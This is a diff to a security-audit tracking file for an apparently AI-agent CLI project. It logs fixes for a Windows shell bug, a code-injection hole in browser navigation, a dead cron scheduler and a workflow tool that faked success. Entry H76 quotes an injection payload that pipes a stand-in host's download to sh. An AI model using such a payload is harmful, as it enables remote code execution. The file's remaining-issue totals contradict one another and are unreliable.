@@ -7,14 +7,14 @@
 | Severity | Total | Fixed | Remaining |
 |----------|-------|-------|-----------|
 | Critical | 11    | 11    | 0         |
-| High     | 89    | 73    | 16        |
+| High     | 89    | 74    | 15        |
 | Medium   | 208   | 0     | 208       |
 | Low      | 80    | 0     | 80        |
-| **Total**| **388** | **84** | **304** |
+| **Total**| **388** | **85** | **303** |
 
 ---
 
-## ✅ Fixed — 11 Critical + 73 High
+## ✅ Fixed — 11 Critical + 74 High
 
 | ID | File | Issue | Fix Summary |
 |----|------|-------|-------------|
@@ -104,8 +104,9 @@
 | H75 | `timps-code/src/tools/bash/index.ts:30` — Bug: primary registered bash tool hardcodes `shell: '/bin/bash'` in `execSync` options; on Windows there is no `/bin/bash` so every invocation throws `spawn /bin/bash ENOENT`; agent's most fundamental tool is broken on a mainline platform; repository README claims cross-platform CLI | Added `process.platform === 'win32'` check: uses `'cmd.exe'` on Windows (Node.js internally runs `cmd.exe /d /s /c`), keeps `'/bin/bash'` on Unix/macOS. Verified: `tsc --noEmit` clean. |
 | H76 | `timps-code/src/tools/browser/index.ts:138` — Security: `navigateTo()` interpolates LLM/user-supplied URL directly into a JS string literal in a generated Node script (`await page.goto('${url}')`) written to a temp file and executed via `execSync` with full Node privileges; `takeScreenshot()` interpolates `screenshotPath` the same way (lines 186-187); a URL containing a single quote breaks out of the string literal and injects arbitrary Node code (e.g. `url = x');require('child_process').execSync('curl evil\|sh');//`) — arbitrary code execution from a tool argument the model controls | Replaced string interpolation with `JSON.stringify()` for both `url` and `screenshotPath` values in generated scripts — `JSON.stringify()` properly escapes all special characters (single quotes, backslashes, template literals) preventing injection. Verified: `tsc --noEmit` clean. |
 | H77 | `timps-code/src/tools/scheduleCron/index.ts:60` — Dead code: `schedule_cron` stores tasks in a module-level Map with `nextRun` hardcoded to `Date.now() + 60000` regardless of cron expression; no timer, scheduler loop, or consumer exists; `listScheduledTasks`/`deleteScheduledTask` have zero callers repo-wide; `durable: true` reports "Persisted to disk" while writing nothing; tasks never fire and vanish on process exit | Rewrote with: proper 5-field cron parser (minutes, hours, dom, mon, dow) that computes correct next run time; `setInterval` scheduler loop (5s tick) that fires tasks at their scheduled time; disk persistence via `~/.timps/scheduled-tasks.json` for durable tasks (load on import, save on create/delete/fire); recurring tasks auto-advance to next cron slot; one-shot tasks auto-delete after firing; `listScheduledTasks`/`deleteScheduledTask` now functional and persisted. Verified: `tsc --noEmit` clean. |
+| H78 | `timps-code/src/tools/workflow/index.ts:122` — Dead code: `workflow` tool `run` action fabricates success — for each step pushes `'[n] Executed: <tool> → OK'` without invoking any tool (only `dryRun` prints honestly); tool description promises "Chain multiple tool calls together with conditional logic"; agent receives confirmation that steps executed when nothing ran; a silent-failure/fake-success pattern | Wired `run` action to actually execute each step via `getTool(step.tool).execute(step.args, cwd)` from the tool registry; captures real results (success content or error message); reports actual output (truncated to 200 chars); tracks failure state and skips subsequent steps on error; returns error exit code if any step fails. Verified: `tsc --noEmit` clean. |
 
-## 📋 Remaining — 305 Issues
+## 📋 Remaining — 304 Issues
 
 ### High (32)
 ⏸️ All 32 remaining High issues are unfixed — awaiting user instruction to proceed
